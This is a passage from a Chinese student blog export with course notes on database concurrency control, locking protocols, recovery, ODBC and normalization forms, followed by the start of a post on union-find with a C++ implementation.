并发控制技术概述</h2><p><strong>事务</strong>：指用户定义的一个数据库的操作序列，这些操作要么全做，要么全不做，是一个不可分割的工作单位。</p><ul><li><strong>原子性</strong>：事务中包括的操作要么都做，要么都不做</li><li><strong>一致性</strong>：事务执行的结果是从一个一致性状态转变到另一个一致性状态</li><li><strong>隔离性</strong>：一个事务的执行不应该被其他事务干扰</li><li><strong>持久性</strong>：事务成功后，对数据库的改变是永久的，即使以后系统出现故障也不会影响。<br>给出事务运行的方式：<strong>串行</strong>和<strong>并行</strong></li><li>串行：每个时刻只有一个事务运行 （<strong>优点</strong>：实现简单，保证事务一致性。<strong>缺点</strong>：效率低）</li><li>并行：同一个时刻可以有多个事务同时运行（<strong>优点</strong>：效率高，提高整个系统吞吐量，减少平均响应时间。<strong>缺点</strong>：破坏事务隔离性，导致数据库不一致性）<br>emm 这里给出 ppt 上讲的<strong>并行和并发的区别</strong></li><li>并行：多个处理器或者是多核的处理器同时处理多个不同的任务，物理上的同时发生</li><li>并发：一个处理器同时处理多个任务，逻辑上的同时发生</li></ul><h2 id="并发控制"><a class="markdownIt-Anchor" href="#并发控制">#</a> 并发控制</h2><h4 id="1并发控制带来的数据不一致行问题"><a class="markdownIt-Anchor" href="#1并发控制带来的数据不一致行问题">#</a> （1）并发控制带来的数据不一致行问题</h4><blockquote><p>以如下飞机订票系统中的活动序列为例<br>①甲售票点 (事务<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">T_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）读出某航班的机票余额 A，设 A=16<br>②乙售票点 (事务<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">T_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）读出同一航班的机票余额 A，也为 16。<br>③甲售票点卖出一张机票，修改余额 A←A-1，所以 A 为 15，把 A 写回数据库。<br>④乙售票点也卖出一 - 张机票，修改余额 A-A-1，所以 A 为 15，把 A 写回数据库。</p></blockquote><p><strong>A. 丢失修改</strong><br>指两个以上事务从数据库中读入同一个数据并修改，其中<strong>后提交的事务</strong>的提交结果破坏了<strong>前提交事务</strong>的提交结果，导致了<strong>先提交事务对数据库的修改丢失</strong>。<br><strong>B. 读脏数据</strong><br>事务 1 修改某一数据，并将其写回磁盘；事务 2 读取同一数据后，事务 1 犹豫某种原因被撤销，这时事务 1 已经修改过的数据被恢复为原值，事务 2 读到的不稳定的瞬间数据就与数据库中的数据产生了不一致，是不正确的数据，又称为脏数据<br><strong> C. 不可重复读</strong><br>事务 1 读取数据后，事务 2 执行了对读取数据的更新操作，事务 1 再次读取时无法再现上一次读取的结果。</p><h4 id="2并发控制概念"><a class="markdownIt-Anchor" href="#2并发控制概念">#</a> （2）并发控制概念</h4><p>如果多个用户并发存取数据的行为不加以控制，那么极有可能破坏事务的隔离性和一致性。因此并发控制就是为了保证多用户并发操作数据库中信息的正确性，一致性所采取的措施。</p><h2 id="封锁封锁协议活锁和死锁"><a class="markdownIt-Anchor" href="#封锁封锁协议活锁和死锁">#</a> 封锁，封锁协议活锁和死锁</h2><h4 id="一封锁"><a class="markdownIt-Anchor" href="#一封锁">#</a> 一，封锁</h4><p>【概念】封锁就是事务 T 在对某个数据对象操作之前，先向系统发出请求，对其加锁；加锁后事务 T 对该数据对象就有了一定的控制，在事务 T 释放它的锁之前，其他事务不能更新此数据对象。<br>【类型】</p><ul><li><strong>排他锁（X 锁）</strong>：又称为<strong>写锁</strong>，若事务 T 对数据对象 A 加上 X 锁，则<strong>只允许 T 读取和修改 A，其他任何事务都不能再对 A 加任何类型的锁</strong>，直到 T<strong> 释放</strong> A 上的锁</li><li><strong>共享锁（S 锁）</strong>：又称<strong>读锁</strong>，若事务 T 对数据对象 A 加上 S 锁，则其他事务<strong>只能再对 A 加 S 锁，而不能加 X 锁</strong>，直到 T<strong> 释放</strong> A 上的 S 锁<br><strong>附加：锁升级</strong></li><li>S 锁允许多个事务同时访问同一个数据对象 A，即允许更多的并发操作。这里我们可以让事务 T 先读取数据对象 A 后写入 A 的新值操作时，可以先申请 S 锁，当要写入时再将锁升级为 W 锁。<br>优点：提高并发执行效率          缺点：增加死锁的可能性</li></ul><h4 id="二封锁协议"><a class="markdownIt-Anchor" href="#二封锁协议">#</a> 二，封锁协议</h4><p>【概念】是指再运用 X 锁和 S 锁对数据对象加锁时需要遵照的一些规则。例如，何时申请，持续时间和何时释放等。不同的封锁协议，为并发操作的正确调度提供了一定的保证，所能达到的系统一致性级别也是不同的。常用的封锁协议有：</p><ul><li>支持一致性维护的<strong>三级封锁协议</strong></li><li>支持并行调度可串行化的<strong>两端封锁协议</strong><br>①一级封锁协议<br>事务 T 在修改数据 R 之前必须先对其加 X 锁，直到事务结束才释放</li><li>防止丢失修改</li><li>不能保证可重复读和不读脏数据<br>②二级封锁协议<br>在一级封锁协议的基础上，增加<strong>事务 T 在读取数据 R 之前必须先对其加上 S 锁</strong>，读取完成之后即可释放 S 锁</li><li>可以防止丢失修改和读脏数据</li><li>不能保证可重复读<br>③三级封锁协议<br>是指在一级封锁协议的基础上增加<strong>事务 T 在读取数据 R 之前必须对其加 S 锁，直到事务结束时才可以释放 S 锁</strong></li><li>放置了丢失修改和读脏数据，还防止了不可重复读</li></ul><h4 id="三饥饿活锁和死锁"><a class="markdownIt-Anchor" href="#三饥饿活锁和死锁">#</a> 三，饥饿，活锁和死锁</h4><p>一个问题的解决必然会导致另一个问题的出现。<strong>封锁技术可以有效地解决并发操作的一致性问题，但是会带来新的问题</strong></p><ul><li><strong>饥饿</strong>：由于<strong>不同锁的类型</strong>导致的，有希望获得<strong>排他锁</strong>，但由于不断获得<strong>共享锁</strong>可能永远等待<br>解决方法：事务 T 申请对数据项 R 加 M 型锁，允许加锁的条件：1，在 R 上不存在与 M 冲突的锁的其他事务。2，不存在等待对 R 加锁，且先于 T 申请加锁的事务</li><li><strong>活锁</strong>：由于<strong>调度顺序</strong>的随机性导致，有希望获得锁，但是由于调度顺序的选择，可能永远等待<br>解决方法：1，封锁管理子系统按照请求封锁的先后顺序对事务排队 2，一旦被申请的数据对象的锁释放，立即批准队列中的一个事务获得锁</li><li><strong>死锁</strong>：由于调度顺序的随机性导致，两个事务同时申请对方正在使用的数据资源，导致相互等待<br>死锁的解决方法：<strong>预防和检测</strong></li></ul><blockquote><p><strong>预防（不可行）</strong>：一次封锁，顺序封锁，基于时标的抢占和事务撤销技术</p><p><strong>检测（DBMS 常用方法）</strong>：超时法：一个事务等待的时间超过了规定的时间，就认为其发生了死锁<br>等待图法：用一个有向图 G，节点表示正在执行的事务，边表示等待情况。如果图中存在回路，则表示发生死锁。</p></blockquote><p><strong>检测后的诊断和修复</strong></p><ul><li>因素 1：选择一个处理死锁代价最小的事务，将其<strong>撤销</strong>，释放锁</li><li>因素 2：决定 rollback 多远。彻底撤销或者 rollback 到可以解决死锁为止。</li><li>因素 3：避免饥饿，避免因为某个事务 rollback 代价最小而一直被 rollback，在代价因素中包括事务的 rollback 次数即可解决。</li></ul><h4 id="四并发调度的可串行性两段锁协议和封锁的粒度"><a class="markdownIt-Anchor" href="#四并发调度的可串行性两段锁协议和封锁的粒度">#</a> 四，并发调度的可串行性，两段锁协议和封锁的粒度</h4><h5 id="一可串行化调度"><a class="markdownIt-Anchor" href="#一可串行化调度">#</a> 一，可串行化调度</h5><p>【概念】多个事务的并发执行是正确的，当且仅当其结果与某一次按次序<strong>串行执行</strong>这些事务时的结果相同，称这种调度策略为可串行化调度。<strong>可串行性</strong>是并发事务正确调度的准则，也即一个给定的并发调度，当且仅当它是可串行化的，才认为是<strong>正确调度</strong>。<br><strong>冲突操作</strong>：是指不同事务对同一个数据的<strong>读写操作</strong>和<strong>写写操作</strong>。除此之外，其他操作均为不冲突操作。<br><strong>冲突可串行化</strong>：一个调度 SC 在保证冲突操作的次序不变的情况下，通过交换两个事务不冲突操作的次序得到另一个调度 SC，如果 SC 是串行的，则称调度 SC 为冲突可串行化的调度。<strong>若一个调度是冲突可串行化的，那么它一定是可串行化的调度</strong>。</p><h5 id="二两段锁协议"><a class="markdownIt-Anchor" href="#二两段锁协议">#</a> 二，两段锁协议</h5><p>两端锁协议是三级封锁协议的特例，目前 DBMS 普遍采用该种协议实现并发调度的可串行性。具体内容如下：</p><ul><li>在对任何数据进行读，写操作之前，首先要申请并获得对该数据的封锁</li><li>在释放一个封锁之后，事务不再申请和获得任何其他封锁<br>其中‘两段’是指事务分为两个阶段：</li><li>第一阶段：获得封锁，也称为扩展阶段。如果该数据项被其他使用者加上不相容的锁，则必须等待。</li><li>第二阶段：释放封锁，也成为收缩阶段。事务在释放锁后，不允许再申请其他锁。</li></ul><h5 id="三封锁的粒度"><a class="markdownIt-Anchor" href="#三封锁的粒度">#</a> 三，封锁的粒度</h5><p>【概念】是指封锁对象的大小。封锁对象可以是<strong>逻辑单元</strong>，也可以是<strong>物理单元</strong>。封锁粒度与系统并发度和并发控制的开销密切相关，一般来说，封锁粒度越大，数据库所能封锁的数据单元就越少，并发度越小，开销就越小。</p><ul><li>逻辑单元：元组，关系，整个数据库等</li><li>物理单元：页，物理记录等<br><strong>选择封锁的原则</strong></li><li>需要处理多个关系的大量元组的用户事务时以<strong>数据库为封锁单位</strong></li><li>需要处理大量元组的用户事务时以<strong>关系</strong>为封锁单元</li><li>只处理少量元组的用户事务时以元组为封锁单位<br><strong>多粒度封锁</strong>：在一个系统中<strong>同时支持多种封锁粒度</strong>供不同的事务选择</li></ul><h2 id="基于时标的并发控制"><a class="markdownIt-Anchor" href="#基于时标的并发控制">#</a> 基于时标的并发控制</h2><h5 id="基于时间标记确定并发执行的事务中操作执行顺序"><a class="markdownIt-Anchor" href="#基于时间标记确定并发执行的事务中操作执行顺序">#</a> 基于时间标记确定并发执行的事务中操作执行顺序</h5><ul><li>根据实物的时标确保实际事务的调度等价于串行调度</li><li>该方法假设没有<strong>非串行化</strong>行为发生，只在违例时进行修复</li><li>修复方法：中止并重启视图参与非可串行化的事务</li></ul><h5 id="时间戳协议的特点"><a class="markdownIt-Anchor" href="#时间戳协议的特点">#</a> 时间戳协议的特点</h5><ul><li>由于冲突操作是按照时标顺序处理的，时标顺序协议能保证调度是可串行化的</li><li>由于没有事务处于等待状态，并发调度不会产生死锁</li><li>时标顺序协议使调度无级连回退调度（不存在事务重启动）</li></ul><h5 id="基于封锁和基于时标的并发控制比较"><a class="markdownIt-Anchor" href="#基于封锁和基于时标的并发控制比较">#</a> 基于封锁和基于时标的并发控制比较</h5><p>封锁 空间小，技术成熟，特点是推迟事务<br>时标 空间大，技术不成熟，特点是回滚事务</p><h1 id="八数据库恢复技术"><a class="markdownIt-Anchor" href="#八数据库恢复技术">#</a> 八，数据库恢复技术</h1><h2 id="一事务的基本概念"><a class="markdownIt-Anchor" href="#一事务的基本概念">#</a> 一，事务的基本概念</h2><p><strong>事务</strong>：是用户定义的一个数据库操作序列。这些操作要么全做，要么不做，是一个不可分割的工作单位。例如在 RDBMS 中一个事务可以是一条 SQL 语句或整个程序。事务是<strong>数据库恢复和并发控制</strong>的基本单位。一般来说，一个程序中包含多个事务。<br><strong>事务的定义</strong>：事物的开始和结束由用户显式控制。如果用户没有显式地定义事务，则由 DBMS 按默认规定自动划分事务。在 SQL 语句中，定义事务语句有以下三条：</p><ul><li><code>BEGIN TRANSACTION</code>  ：表示事务的开始</li><li><code>COMMIT</code> ：表示事务的正常结束并提交事务的所有操作</li><li><code>ROLLBACK</code> ：表示事务的结束，但没有正常结束，需要进行<strong>回滚</strong>（撤销已经完成的操作，使系统恢复至回滚前状态）</li></ul><h4 id="事务的四个特性acid"><a class="markdownIt-Anchor" href="#事务的四个特性acid">#</a> 事务的四个特性 ——ACID</h4><p>A. 数据库的 ACID<br>①：<strong>原子性</strong><br>事务是数据库的<strong>逻辑工作单位</strong>，事务中包含的诸多操作或全做或全不做。因故障未能做完的，需要有一套机制用于撤销那一部分已经做了的。<br>②：<strong>一致性</strong><br>事务执行的结果必须是使数据库从<strong>一个一致性状态边到另一个一致性状态</strong></p><ul><li>一致性状态：数据库中只包含成功事务提交的结果</li><li>不一致状态：数据库中包含事务未完成时的状态<br>③：<strong>隔离性</strong><br>一个事务不能被其他事务干扰。也即一个事务的内部操作及使用的数据对其他并发事务是隔离的，并发执行的各个事务之间不能<strong>互相干扰</strong><br>④：<strong>持续性</strong><br>一个事务一旦提交，它对数据库中的数据的改变就是<strong>永久性</strong>的。接下来的其他操作或故障不应该对其执行结果有任何影响<br> B: 破坏 ACID 的因素</li><li>故障：没有执行完；虽然没有完，但是存储介质故障</li><li>并发干扰：多个事务并行运行时，不同的事务操作交叉执行，互相干扰。破坏了 ACID 中的 I</li></ul><h4 id="数据库恢复概述"><a class="markdownIt-Anchor" href="#数据库恢复概述">#</a> 数据库恢复概述</h4><p>【定义】吧数据库从因破坏或故障而导致的错误状态恢复到某个已知的正确状态的技术<br><strong>目的</strong>：</p><ul><li>保持事务的<strong>原子性</strong></li><li>保持事务的<strong>持久性</strong></li></ul><h2 id="故障种类"><a class="markdownIt-Anchor" href="#故障种类">#</a> 故障种类</h2><h3 id="一事务故障"><a class="markdownIt-Anchor" href="#一事务故障">#</a> 一，事务故障</h3><h4 id="事务故障概念"><a class="markdownIt-Anchor" href="#事务故障概念">#</a> 事务故障概念</h4><p>某个个事务在运行过程中由于种种原因未运行到正常终止点就夭折了</p><h4 id="事务故障原因"><a class="markdownIt-Anchor" href="#事务故障原因">#</a> 事务故障原因</h4><ul><li>运算溢出</li><li>违反了某些完整性约束</li></ul><h3 id="二系统故障"><a class="markdownIt-Anchor" href="#二系统故障">#</a> 二，系统故障</h3><h1 id="九数据库编程"><a class="markdownIt-Anchor" href="#九数据库编程">#</a> 九，数据库编程</h1><h3 id="数据库编程概念"><a class="markdownIt-Anchor" href="#数据库编程概念">#</a> 数据库编程概念</h3><p>建立数据库的目的是<strong>开发应用系统</strong><br> SQL 语言特点：</p><ul><li>非过程化查询语言</li><li>操作同一，面向集合，功能丰富，使用简单<br><strong>应用系统使用 SQL 编程访问管理数据库的方式</strong>：</li><li>嵌入式 SQL</li><li>过程化 SQL：PL/SQL</li><li>存储过程和自定义函数</li><li>开放数据库连接 ODBC</li><li>JDBC java 数据库连接</li></ul><h3 id="嵌入式sql"><a class="markdownIt-Anchor" href="#嵌入式sql">#</a> 嵌入式 SQL</h3><h5 id="数据库管理sql的两种方式"><a class="markdownIt-Anchor" href="#数据库管理sql的两种方式">#</a> 数据库管理 SQL 的两种方式</h5><ul><li>交互式和嵌入式<br>嵌入式 SQL：</li><li>将 SQL 语句嵌入程序设计语言中，被嵌入的程序语言成为宿主语言，简称主语言</li><li>为了进行区分，SQL 语句需要加上前缀</li></ul><h3 id="数据库应用体系结构"><a class="markdownIt-Anchor" href="#数据库应用体系结构">#</a> 数据库应用体系结构</h3><h3 id="odbc编程"><a class="markdownIt-Anchor" href="#odbc编程">#</a> ODBC 编程</h3><p>【定义】ODBC 标准是一个接口，通过接口应用程序可以利用独立于 DVMS 的方法来访问数据库和在数据库中处理 SQL。<br>包括</p><ul><li>数据源：是一个数据库，包括相关的 DBMS，操作系统，网络平台</li><li>DBMS Driver: 由 dBMS 厂商提供独立的软件公司</li><li>Driver MAnager：应用软件运行的平台，由 O/S 厂商提供</li></ul><h5 id="odbc的优缺点"><a class="markdownIt-Anchor" href="#odbc的优缺点">#</a> ODBC 的优缺点</h5><ul><li>优点：互操作能力，应用程序对数据操作不依赖于 DBMS</li><li>缺点：功能受限：部分驱动器仅仅实现核心 API 函数，功能降低：无法通过 SQL 语句利用数据库优化器</li></ul><h3 id="jdbc编程"><a class="markdownIt-Anchor" href="#jdbc编程">#</a> JDBC 编程</h3><h1 id="十关系数据库设计"><a class="markdownIt-Anchor" href="#十关系数据库设计">#</a> 十，关系数据库设计</h1><h3 id="问题的提出"><a class="markdownIt-Anchor" href="#问题的提出">#</a> 问题的提出</h3><h5 id="冗余导致的问题"><a class="markdownIt-Anchor" href="#冗余导致的问题">#</a> 冗余导致的问题</h5><ul><li>插入异常：</li><li>删除异常</li><li>数据冗余</li><li>更新复杂<br>解决方法：模式分解</li></ul><h2 id="规范化"><a class="markdownIt-Anchor" href="#规范化">#</a> 规范化</h2><h3 id="数据依赖"><a class="markdownIt-Anchor" href="#数据依赖">#</a> 数据依赖</h3><p>数据以来是一个关系<strong>内部属性和属性</strong>之间的约束关系。这种约束关系是通过属性值的相等与否体现出来的数据间相关联系。它是现实世界属性间相互联系的抽象，体现在关系模式中的各属性之间相互依赖相互制约的关系。</p><h4 id="函数依赖最重要"><a class="markdownIt-Anchor" href="#函数依赖最重要">#</a> 函数依赖（最重要）</h4><ul><li>关系模式中属性之间的一种逻辑依赖关系<br>函数依赖有 非平凡函数依赖，平凡函数依赖，完全函数依赖，部分函数依赖，函数传递依赖。</li><li>非平凡函数依赖：X 确定 Y，但 Y 不是 X 的子集</li><li>平凡函数依赖：X 确定 Y，Y 是 X 的子集</li><li>完全函数依赖：X 确定 Y，那么 X 中的任何一个分量都不能丢。</li><li>部分函数依赖：X 确定 Y，即便去掉 X 的一个或者多个分量，剩余分量也能确定 Y</li><li>传递函数依赖：如果 X 是 Y 的非平凡函数依赖，且 Y 不是 X 的函数依赖，同时 Y 是 Z 的非平凡函数依赖，则称 Z 对 X 传递函数依赖。</li></ul><h4 id="多值依赖"><a class="markdownIt-Anchor" href="#多值依赖">#</a> 多值依赖</h4><p>多值依赖就是 X 能够确定一组其他值，例如，一门课程有多个老师，但是一门课程的参考书籍是固定的 ABC，这样的关系可能会产生一些问题：</p><ul><li>插入异常：增加一名讲课教师时，必须插入多个元组，即每次都要插入三个书籍，故要插入三个元组。</li><li>删除异常：例如一门课想要删除一本参考书，则要删除所有老师后面对应的参考书<br><strong>函数依赖是多值依赖的特例</strong><br>解决方法仍然是模式分解</li></ul><h3 id="范式"><a class="markdownIt-Anchor" href="#范式">#</a> 范式</h3><h4 id="第一范式-1nf"><a class="markdownIt-Anchor" href="#第一范式-1nf">#</a> 第一范式 1NF</h4><p>【定义】：如果一个关系中的所有属性值均是原子的，则称该关系满足 1NF。直观讲：就是关系中任何一列中不能再分为两列或者更多列。</p><h4 id="第二范式-2nf"><a class="markdownIt-Anchor" href="#第二范式-2nf">#</a> 第二范式 2NF</h4><p>【定义】若 R∈1NF，且每个非主属性（不是候选码中出现的属性）完全依赖于码，则称 R 是第二范式。直观的讲：就是一个表中只能保存一种数据，不能把多种数据保存在同一张表。</p><h4 id="第三范式-3nf"><a class="markdownIt-Anchor" href="#第三范式-3nf">#</a> 第三范式 3NF</h4><p>【定义】关系模式 R&lt;U,F&gt; 中若不存在这样的码 X，属性组 Y 以及非主属性组 Z (Z 不属于 Y)，使得 X-&gt;Y,Y-&gt;Z 和 Y 不确定 X 成立，则称 R 属于 3NF。（即消除非主属性对码的传递性依赖）直观上：就是确保表中的每列数据都和主码直接相关，而不是间接相关。专业定义就是保证每个非主属性码对码既不是部分函数依赖也不是传递函数依赖。</p><h4 id="bcnf"><a class="markdownIt-Anchor" href="#bcnf">#</a> BCNF</h4><p>【定义】关系模式 R，若 X 确定 Y 且 Y 不属于 X，X 必含有码，则 R 是 BCNF。直观上讲：BCNF 是修正的第三范式，修正了每一属性对候选码的传递依赖。BCNF 一定是 3NF，3NF 不一定是 BCNF。</p><ul><li>所有非主属性对每个码都是完全函数依赖</li><li>所有的主属性对每一个不包含它的码也是完全函数依赖</li><li>没有任何属性完全函数依赖于非码的任何一组属性</li></ul><h4 id="4nf"><a class="markdownIt-Anchor" href="#4nf">#</a> 4NF</h4><p>【定义】简单点说，要满足 4NF，那么该关系模式的多值依赖要不是平凡的，如果是非平凡的，就必须退化为函数依赖。就是说<strong>非平凡又非函数依赖的多值依赖是不允许存在的</strong></p><h2 id="数据依赖的公理系统"><a class="markdownIt-Anchor" href="#数据依赖的公理系统">#</a> 数据依赖的公理系统</h2><ul><li>数据依赖的公理系统是模式分解算法的理论基础</li><li>ARMstrong 公理系统：函数依赖的一个有效而完备的公理系统</li><li>定义：逻辑蕴含：对于满足一组函数依赖 F 的关系模式 R，其中任何一个关系 r, 若函数依赖 X 确定 Y 都成立，则称 F 逻辑蕴含 X 确定 Y。</li></ul><h4 id="推理规则"><a class="markdownIt-Anchor" href="#推理规则">#</a> 推理规则</h4><p>设 U 为属性集总体，F 是 U 上的一组函数依赖，于是有关系模式 R&lt;U,F&gt;, 对 R&lt;U,F &gt; 来说有以下推理规则：</p><ul><li><strong>自反律</strong>：若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi><mo>⊆</mo><mi>X</mi><mo>⊆</mo><mi>U</mi></mrow><annotation encoding="application/x-tex">Y\subseteq X\subseteq U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span>，则 X-&gt;Y 为 F 所蕴含</li><li><strong>增广律</strong>：若 X-&gt;Y 为 F 所蕴含，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi><mo>⊆</mo><mi>U</mi></mrow><annotation encoding="application/x-tex">Z\subseteq U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span> 则 XZ-&gt;YZ 为 F 所蕴含</li><li><strong>传递律</strong>：若 X-&gt;Y 和 Y-&gt;Z 为 F 所蕴含，则 X-&gt;Z 为 F 所蕴含。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 课程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法学习</title>
      <link href="/2023/11/15/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/11/15/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>这里更新主要更新一些 模板 / 数据结构 /… 的题目吧</p><h1 id="图"><a class="markdownIt-Anchor" href="#图">#</a> 图</h1><h3 id="并查集"><a class="markdownIt-Anchor" href="#并查集">#</a> 并查集</h3><p>【定义】：用来管理元素分组情况的数据结构。并查集可以高效的进行如下操作：</p><ul><li>查询元素 a 和元素 b 是否属于同一组</li><li>合并元素 a 和 b 所在的组<br><strong>需要注意并查集只能进行合并操作，但是无法进行分割操作</strong><br>【结构】：并查集是利用树形结构实现的。不过不是二叉树。<br>（1）初始化：<br>首先准备 n 个节点代表 n 个元素。最开始没有边。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(1).png?raw=true" alt="初始化"><br>（2）合并：<br>如图，从一个组的根向另一个组的根连边，这样两棵树变成一颗树，也就把两个组合合并为一个组。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(2).png?raw=true" alt="合并"><br>（3）查询：<br>为了查询两个节点是否属于同一组，需要沿着树向上走，来查询包含这个元素的根是谁。两个节点走到同一个根，则说明他们属于同一组。下图 5，2 走到 1，7 走到 6，所以 7 和 2，5 不是同一组。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot.png?raw=true" alt="查询"><br><strong>并查集实现中注意的点：</strong><br>避免退化！</li><li>对于每颗树，记录这棵树的高度（rank）</li><li>合并时如果两棵树的 rank 不同，则 rank 小的向 rank 大的连边。<br>此外，通过路径压缩，可以使并查集更高效。对每个节点，一旦走到了一次根节点，就把这个点到父亲的边改为直连连向根。如图<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screensho1.png?raw=true" alt="路径压缩"></li></ul><p><strong>这里给出并查集的实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> par[MAX_N]; <span class="comment">//父亲</span></span><br><span class="line"><span class="type">int</span> rank[MAX_N]; <span class="comment">//树的高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化n个元素</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">par[i] = i;</span><br><span class="line">rank[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询树的根</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(par[x] == x)&#123;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> par[x] = <span class="built_in">find</span>(par[x]); <span class="comment">//路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并x和y所属的集合</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unite</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">x = <span class="built_in">find</span>(x);</span><br><span class="line">y = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(x == y) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt; rank[y])&#123;</span><br><span class="line">par[x] = y;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">par[y] = x;</span><br><span class="line"><span class="keyword">if</span> (rank[x] == rank[y]) rank[x]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断 x 和 y 是否属于同一个集合</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">same</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(x) == <span class="built_in">find</span>(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="并查集题目扩展思路"><a class="markdownIt-Anchor" href="#并查集题目扩展思路">#</a> 并查集题目扩展思路</h4><p>这里遇到了一个很有意思的题，类型是：类似于倒着的并查集连接，当一个图失去了某个顶点，求当前图是否连通，或者当前图有几个联通分量。思路是记录各边，倒着以并查集合并的方式做题。<br><a href="https://www.luogu.com.cn/problem/P3144">P3144 